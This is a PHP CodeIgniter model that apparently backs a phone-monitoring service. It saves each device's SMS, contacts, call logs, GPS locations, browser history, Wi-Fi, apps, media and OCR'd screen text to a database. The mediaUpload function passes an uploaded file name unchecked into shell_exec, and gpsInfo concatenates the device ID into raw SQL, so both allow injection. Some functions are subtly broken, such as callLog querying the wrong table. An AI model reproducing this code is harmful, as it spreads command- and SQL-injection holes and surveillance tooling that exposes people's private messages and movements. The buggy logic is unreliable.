<?php
class Device_model extends CI_Model {

	public function __construct() {
		$this -> load -> database();
	}

	function saveDeviceInfo($input = "") {

		$gm_time = get_gmt_time();

		$data = make_serialize($input['data']);
		$this -> db -> where('uuid', $input['uuid']);
		$check = $this -> db -> get('device_info');
		if ($check -> num_rows() > 0) {
			$row = $check -> row_array();
			$in_arr = array("device_detail" => $data, "updatedon" => $gm_time);

			$this -> db -> where('uuid', $input['uuid']);
			$qry_res = $this -> db -> update('device_info', $in_arr);
			$id = $row['id'];

		} else {
			$in_arr = array("uuid" => $input['uuid'], "device_detail" => $data, "createdon" => $gm_time);

			$qry_res = $this -> db -> insert('device_info', $in_arr);
			$id = (string)$this -> db -> insert_id();

		}

		if ($qry_res) {
			  	$this->db->where('device_id',$input['uuid']);
$this->db->delete('deleted_device');
			return $id;
		}
		  
		return false;
	}

	/*function saveDeviceInfo($input = "") {

	 $gm_time = get_gmt_time();

	 $data = make_serialize($input['data']);
	 $this -> db -> where('uuid', $input['uuid']);
	 $check = $this -> db -> get('device_info');
	 if ($check -> num_rows() > 0) {
	 $row = $check -> row_array();
	 $in_arr = array("device_detail" => $data, "updatedon" => $gm_time);

	 $this -> db -> where('uuid', $input['uuid']);
	 $qry_res = $this -> db -> update('device_info', $in_arr);
	 $id = $row['id'];

	 } else {
	 $in_arr = array("uuid" => $input['uuid'], "device_detail" => $data, "createdon" => $gm_time);

	 $qry_res = $this -> db -> insert('device_info', $in_arr);
	 $id = (string)$this -> db -> insert_id();

	 }

	 if ($qry_res) {
	 return $id;
	 }
	 return false;
	 }*/

	function check_uuid($uuid) {
		$this -> db -> select('uuid');
		$this -> db -> where('uuid', $uuid);
		$query = $this -> db -> get('device_info');
		if ($query -> num_rows() > 0) {
			return TRUE;
		} else {

		}
	}
	
		
		function ocrMediaUploadEnd($input)
		{
						$in_arr = array("video_made" => '0');

			$this -> db -> where('ocr_code', $input['ocr_code']);
			$qry_res = $this -> db -> update('ocr_media', $in_arr);
			if($qry_res){
			return true;
			}else{
				return false;
			}
		}
		
			function deviceBatteryLevel($input)
		{
						$in_arr = array("battery_level" => "LOW","battery"=>$input['battery']);

			$this -> db -> where('uuid', $input['uuid']);
			$qry_res = $this -> db -> update('device_info', $in_arr);
			if($qry_res){
			return true;
			}else{
				return false;
			}
		}
		
	 function deviceReady($input = "")
    {
      
   $gm_time = get_gmt_time();
   
 
	 $in_arr = array(
	 "uuid"=>$input['uuid'],
            "is_ready" => '1',
            "createdon" => $gm_time);
			
		 
			$qry_res= $this->db->insert('tb_ready', $in_arr);
            $this->deleteDeviceRequest($input['uuid']);
        return $qry_res;
    }
	function deleteDeviceRequest($uuid)
	{
		$this->db->where("uuid",$uuid);
	 $qry_res =	$this->db->delete("data_request");
		return $qry_res;
	}
	
		function deviceDeleted($uuid){
		$this->db->where("device_id",$uuid);
	 $query =	$this->db->get("deleted_device");
	 if($query->num_rows()>0){
	 	return "1";
	 }else{
	 	return "0";
	 }
	}
	
	function deviceGeneralInfo($input = "") {

		$gm_time = get_gmt_time();

		$data = make_serialize($input['data']);
		$this -> db -> where('uuid', $input['uuid']);
		$check = $this -> db -> get('device_general');
		if ($check -> num_rows() > 0) {
			$row = $check -> row_array();
			$in_arr = array("detail" => $data, "updatedon" => $gm_time);

			$this -> db -> where('uuid', $input['uuid']);
			$qry_res = $this -> db -> update('device_general', $in_arr);
			$id = $row['id'];

		} else {
			$in_arr = array("uuid" => $input['uuid'], "detail" => $data, "createdon" => $gm_time);

			$qry_res = $this -> db -> insert('device_general', $in_arr);
			$id = (string)$this -> db -> insert_id();

		}

		if ($qry_res) {
			return true;
		}
		return false;
	}
		

		function deviceEventInfo($input = "") {

		$gm_time = get_gmt_time();

		$data = make_serialize($input['data']);
		$this -> db -> where('uuid', $input['uuid']);
		$check = $this -> db -> get('device_events');
		if ($check -> num_rows() > 0) {
			$row = $check -> row_array();
			$in_arr = array("detail" => $data, "updatedon" => $gm_time);

			$this -> db -> where('uuid', $input['uuid']);
			$qry_res = $this -> db -> update('device_events', $in_arr);
			$id = $row['id'];

		} else {
			$in_arr = array("uuid" => $input['uuid'], "detail" => $data, "createdon" => $gm_time);

			$qry_res = $this -> db -> insert('device_events', $in_arr);
			$id = (string)$this -> db -> insert_id();

		}

		if ($qry_res) {
			return true;
		}
		return false;
	}
	
	
	
	
	function smsInfo($input = "") {

		$gm_time = get_gmt_time();

		$data = make_serialize($input['data']);
		$this -> db -> where('uuid', $input['uuid']);
		$check = $this -> db -> get('device_native_sms');
		if ($check -> num_rows() > 0) {
			$row = $check -> row_array();
			$in_arr = array("sms_detail" => $data, "updatedon" => $gm_time);

			$this -> db -> where('uuid', $input['uuid']);
			$qry_res = $this -> db -> update('device_native_sms', $in_arr);
			$id = $row['id'];

		} else {
			$in_arr = array("uuid" => $input['uuid'], "sms_detail" => $data, "createdon" => $gm_time);

			$qry_res = $this -> db -> insert('device_native_sms', $in_arr);
			$id = (string)$this -> db -> insert_id();

		}

		if ($qry_res) {
			return true;
		}
		return false;
	}
	function get_data_settings($device_id)
	{
		$this -> db -> where("uuid" ,$device_id );
		$query = $this -> db -> get('device_setting');
 
       return $query->row_array();
	}
	
	function contactInfo($input = "") {

		$gm_time = get_gmt_time();

		$data = make_serialize($input['data']);
		$this -> db -> where('device_id', $input['uuid']);
		$check = $this -> db -> get('device_contact');
		if ($check -> num_rows() > 0) {
			$row = $check -> row_array();
			$in_arr = array("contact_detail" => $data, "updatedon" => $gm_time);

			$this -> db -> where('device_id', $input['uuid']);
			$qry_res = $this -> db -> update('device_contact', $in_arr);
			$id = $row['id'];

		} else {
			$in_arr = array("device_id" => $input['uuid'], "contact_detail" => $data, "createdon" => $gm_time);

			$qry_res = $this -> db -> insert('device_contact', $in_arr);
			$id = (string)$this -> db -> insert_id();

		}

		if ($qry_res) {
			return true;
		}
		return false;
	}

	function callLog($input = "") {

		$gm_time = get_gmt_time();

		$data = make_serialize($input['data']);
		$this -> db -> where('uuid', $input['uuid']);
		$check = $this -> db -> get('device_contact');
		if ($check -> num_rows() > 0) {
			$row = $check -> row_array();
			$in_arr = array("call_detail" => $data, "updatedon" => $gm_time);

			$this -> db -> where('uuid', $input['uuid']);
			$qry_res = $this -> db -> update('call_log', $in_arr);
			$id = $row['id'];

		} else {
			$in_arr = array("uuid" => $input['uuid'], "call_detail" => $data, "createdon" => $gm_time);

			$qry_res = $this -> db -> insert('call_log', $in_arr);
			$id = (string)$this -> db -> insert_id();

		}

		if ($qry_res) {
			return true;
		}
		return false;
	}

     function gpsInfo($input = "")
    {
      
   $gm_time = get_gmt_time();
  $data= json_decode($input['data'],true);
  date_default_timezone_set("UTC");
     $timestamp = strtotime($data['DateTime']);
 $location_time=date('H:i', $timestamp);;
  
   $latlng="[".$data['Latitude'].",".$data['Longitude'].",".$location_time."]";

 
$check= $this->db->query("select * from device_gps where device_id='".$input['uuid']."' and 
date(createdon)= date('".$gm_time."') ");
 if($check->num_rows()>0){
 	
 	$row =$check->row_array();
	 $in_arr = array(
            "location_detail" => $row['location_detail']."|".$latlng,
            "updatedon" => $gm_time);
			$this->db->where("date(createdon)= date('".$gm_time."') ");
			$this->db->where('device_id',$input['uuid']);
			$qry_res= $this->db->update('device_gps', $in_arr);
             $id =$row['id'];
 	
 }else{
   $in_arr = array(
            "device_id"=>$input['uuid'],
            "location_detail" => $latlng,
            "createdon" => $gm_time);
			
			
			$qry_res= $this->db->insert('device_gps', $in_arr);
			$id = (string) $this->db->insert_id();
             
 }
 
        if ($qry_res) {
            return true;
        }
        return false;
    }

	function browserHistoryInfo($input = "") {

		$gm_time = get_gmt_time();

		$data = make_serialize($input['data']);
		$this -> db -> where('uuid', $input['uuid']);
		$check = $this -> db -> get('device_browser_history');
		if ($check -> num_rows() > 0) {
			$row = $check -> row_array();
			$in_arr = array("browser_history_detail" => $data, "updatedon" => $gm_time);

			$this -> db -> where('uuid', $input['uuid']);
			$qry_res = $this -> db -> update('device_browser_history', $in_arr);
			$id = $row['id'];

		} else {
			$in_arr = array("uuid" => $input['uuid'], "browser_history_detail" => $data, "createdon" => $gm_time);

			$qry_res = $this -> db -> insert('device_browser_history', $in_arr);
			$id = (string)$this -> db -> insert_id();

		}

		if ($qry_res) {
			return true;
		}
		return false;
	}

	function wifiInfo($input = "") {

		$gm_time = get_gmt_time();

		$data = make_serialize($input['data']);
		$this -> db -> where('uuid', $input['uuid']);
		$check = $this -> db -> get('device_wifi_conn');
		if ($check -> num_rows() > 0) {
			$row = $check -> row_array();
			$in_arr = array("wifi_detail" => $data, "updatedon" => $gm_time);

			$this -> db -> where('uuid', $input['uuid']);
			$qry_res = $this -> db -> update('device_wifi_conn', $in_arr);
			$id = $row['id'];

		} else {
			$in_arr = array("uuid" => $input['uuid'], "wifi_detail" => $data, "createdon" => $gm_time);

			$qry_res = $this -> db -> insert('device_wifi_conn', $in_arr);
			$id = (string)$this -> db -> insert_id();

		}

		if ($qry_res) {
			return true;
		}
		return false;
	}

	function appInfo($input = "") {

		$gm_time = get_gmt_time();

		$data = make_serialize($input['data']);
		$this -> db -> where('uuid', $input['uuid']);
		$check = $this -> db -> get('device_apps');
		if ($check -> num_rows() > 0) {
			$row = $check -> row_array();
			$in_arr = array("app_detail" => $data, "updatedon" => $gm_time);

			$this -> db -> where('uuid', $input['uuid']);
			$qry_res = $this -> db -> update('device_apps', $in_arr);
			$id = $row['id'];

		} else {
			$in_arr = array("uuid" => $input['uuid'], "app_detail" => $data, "createdon" => $gm_time);

			$qry_res = $this -> db -> insert('device_apps', $in_arr);
			$id = (string)$this -> db -> insert_id();

		}

		if ($qry_res) {
			return true;
		}
		return false;
	}
function getOcrSetting($uuid)
{
	$this -> db -> where('uuid', $uuid);
		$check = $this -> db -> get('device_setting');
		if ($check -> num_rows() > 0) {
			$row = $check -> row_array();
			return $row->ocrtype;
		}
		return 0;
}
		     function mediaUpload($input = "")
    {
     $ocrtype = 	'';
       $other = $filepath ="";
$mediatime =   $gm_time = get_gmt_time();
   if(isset($input['media_datetime'])){
   	$mediatime = $input['media_datetime'];
   }
   if(isset($input['other'])){
   	$other = $input['other'];
   }
   
   if(isset($input['path'])){
   	$filepath = $input['path'];
   }
    if(isset($input['filepath'])){
   	$filepath = $input['filepath'];
   }
   $filename = $input['file_name'];
  $pos = strpos($filename, "caf");
 if($pos!==false){
 	$unique = uniqid();
 	shell_exec("ffmpeg -i './upload/media/".$input['file_name']."' -vn -ar 44100 -ac 2 -ab 192 -f mp3 "."./upload/media/".$unique.".mp3");
 $filename = $unique.".mp3";
 $other = $input['file_name'];
 unlink("./upload/media/".$input['file_name']);
 }
   $in_arr = array(
            "device_id"=>$input['uuid'],
             "file_name"=>$filename,
              "file_type"=>$input['file_type'],
              "app_name"=>$input['app_name'],
               "module"=>$input['module'],
              "media_datetime"=> $mediatime,       
             "filepath"=>  $filepath,
              "other"=>$other,
            "createdon" => $gm_time);
			
			
			$qry_res= $this->db->insert('media', $in_arr);
			$id = (string) $this->db->insert_id();
             
 
 
        if ($qry_res) {
            return true;
        }
        return false;
    }

	/*function deviceToken_Info($input_method)
	 {
	 $req_array = array(
	 "device_token"=>$input_method['device_token']
	 );
	 $this->db->where('uuid',$input_method['uuid']);
	 $query =  $this->db->update('device_info',$req_array);
	 $rows = $this->db->affected_rows();
	 if($rows){
	 return TRUE;
	 }else{
	 return FALSE;
	 }
	 }*/
	function saveDeviceToken($input = "") {
		$qry_res = false;
		$gm_time = get_gmt_time();

		$this -> db -> where('uuid', $input['uuid']);
		$check = $this -> db -> get('device_info');
		if ($check -> num_rows() > 0) {
			$row = $check -> row_array();
			$in_arr = array("device_token" => $input['device_token'], "updatedon" => $gm_time);

			$this -> db -> where('uuid', $input['uuid']);
			$qry_res = $this -> db -> update('device_info', $in_arr);
			$id = $row['id'];

		} else {
			$in_arr = array("uuid" => $input['uuid'], "device_token" => $input['device_token'], "createdon" => $gm_time);

			$qry_res = $this -> db -> insert('device_info', $in_arr);
			$id = (string)$this -> db -> insert_id();

		}

		if ($qry_res) {
			return $id;
		}
		return false;
	}
     function saveDeviceStatus($input = "")
    {
      
   $gm_time = get_gmt_time();
   
 
	 $in_arr = array(
            "status" => 'ONLINE',
            "last_status_check" => $gm_time);
			
			$this->db->where('uuid',$input['uuid']);
			$qry_res= $this->db->update('device_info', $in_arr);
            
        return $qry_res;
    }
	
     	 function checkDeviceRequest($input = "")
    {
      
  $this->db->where("uuid",$input['uuid']);
 $query = $this->db->get('data_request');
        if($query->num_rows()>0){
        		$this->db->where("uuid",$input['uuid']);
               $this->db->delete("data_request");
			
        	return true;
        }else{
        	return false;
        }    
         
    }
	
		     function ocrMediaUpload($input = "")
    {
      $other = "";
	  $ocr_code = "";
   $mediatime = $gm_time = get_gmt_time();
   if(isset($input['media_datetime'])){
   	$mediatime = $input['media_datetime'];
   }
   if(isset($input['other'])){
   	$other = $input['other'];
   }
   if(isset($input['ocr_code'])){
   	$ocr_code = $input['ocr_code'];
   }
$ocrtype =  $this->checkOcrType($input['device_id']);
 
   $in_arr = array(
            "device_id"=>$input['device_id'],
             "file_name"=>$input['file_name'], 
               "ocr_text"=>$input['ocr_text'], 
            "ocr_code"=>$ocr_code,  
           "ocr_type"=> $ocrtype,            
            "createdon" => $gm_time);
			
			
			$qry_res= $this->db->insert('ocr_media', $in_arr);
			$id = (string) $this->db->insert_id();
             
 
 
        if ($qry_res) {
            return true;
        }
        return false;
    }
	function checkOcrType($deviceid){
		$this->db->where("uuid",$deviceid);
		$query = $this->db->get("device_setting");
		 
		if($query->num_rows()>0){
			  $row = $query->row();
			return $row->ocrtype;
		}else{
			return 0;
		}
	}
}
?>
